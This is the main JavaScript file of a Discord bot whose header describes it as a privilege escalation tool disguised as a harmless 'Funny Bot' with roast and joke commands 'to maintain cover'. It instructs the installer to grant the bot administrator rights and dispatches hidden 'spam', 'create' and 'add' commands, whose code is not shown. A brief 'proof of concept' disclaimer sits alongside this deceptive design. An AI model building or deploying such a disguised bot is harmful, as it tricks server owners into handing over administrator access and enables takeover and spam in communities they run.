/**
 * IMPORTANT: 
 * > THIS BOT IS A PROOF OF CONECPT, ONLY USE ON SERVERS YOU HAVE PERMISSION TO : DO NOT USE FOR MALICIOUS PURPOSES
 * > DEVELOPER IS NOT RESPONSIBLE FOR ANY DAMAGE DONE WITH BOT BY OTHERS
 * 
 * REQUIREMENTS:
 * > node.js installed
 * > discord.js npm packaged installed
 * 
 * HOW TO START:
 * > Setup bot as an application on your discord developer portal (https://discord.com/developers/applications)
 * > Create invite link using Discord's built in link generator and make sure the bot's permissions are set to only administrator 
 * > Add bot to server
 * > Run 'node .' in code to start bot
 * 
 * > This bot is meant to be used as a privilege escalation tool for Discord servers
 * > Bot can be customized to be used however is needed to maintain cover, though the default is the 'Funny Bot' cover 
 * and customizing requires some discord.js knowledge
 * > Commands can be added and removed for modularity, again, some discord.js knowledge is needed
 * 
 * 
 * NOTE:
 * > Bot must be on the server for use
 * > There are still a few bugs being worked with the '-create' and '-add' commands so expect a few issues
 * > There is no multi-command handling so if more than one person tries to use a command at the same time nothing will happen for either of them.
 * If needed on multiple servers it is recommened to host different instances of the bot
 */

const Discord = require('discord.js');
const bot = new Discord.Client();

const { token } = require('./config.json'); //create a config.json file and put your discord token in
                                            //follow https://discordjs.guide/creating-your-bot/#using-config-json for more info

const prefix = '-'; //change optional, really just personal preference

const fs = require('fs');

bot.commands = new Discord.Collection();

const commandFiles = fs.readdirSync('./commands/').filter(file => file.endsWith('.js'));
for(const file of commandFiles){
    const command = require(`./commands/${file}`);

    bot.commands.set(command.name, command);
}


bot.on('ready', () =>{
    console.log('BOT ONLINE');
})

bot.on('message', message=>{
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();

    /**
     * To add new commands or change commands, follow format below
     * Make new file in commands folder (follow other format of other commands code) then add below
     */

    if (command === 'help') {
        bot.commands.get('help').execute(message, args);
    } else if (command === 'roast') {
        bot.commands.get('roast').execute(message, args);
    } else if (command === 'joke') {
        bot.commands.get('joke').execute(message, args);
    } else if (command === 'spam') {
        bot.commands.get('spam').execute(message, args);
    } else if (command === 'create') {
        bot.commands.get('create').execute(message, args);
    } else if (command === 'add') {
        bot.commands.get('add').execute(message, args);
    } else {
        message.channel.send("Invalid command try again.");
    }
})

bot.login(token);